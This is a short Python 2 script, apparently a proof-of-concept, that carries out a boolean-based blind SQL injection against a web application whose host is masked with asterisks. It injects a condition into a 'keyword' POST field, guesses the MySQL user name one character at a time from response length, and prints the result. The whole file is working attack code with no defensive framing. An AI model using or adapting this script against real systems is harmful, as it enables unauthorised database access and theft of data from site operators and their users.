#! usr/bin/env python

# -*- coding: utf-8 -*-

import httplib

import time

import string

import sys

import random

import urllib

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

print 'start to retrive MySQL user:'

user = ''

for i in range(1,21):

	for payload in payloads:

		s = "1' and ascii(mid(lower(user()),"+str(i)+",1))="+str(ord(payload))+" and '%'='" #payload

		data=urllib.urlencode({'keyword': s})

		conn = httplib.HTTPConnection('**.**.**.**', timeout=10)      #连接,host

		conn.request('POST',"/waptwo/keywordL**.**.**.**o?businessId=3&ut=index",data,headers)  #url

		html_header= conn.getresponse().read()

		length=len(html_header)

		if length>7000:

			user+=payload

			sys.stdout.write('\r[In progress] %s' % user)

			sys.stdout.flush()

			break

		else:

			print '.',

			conn.close()

print '\n[Done]MySQL user is', user

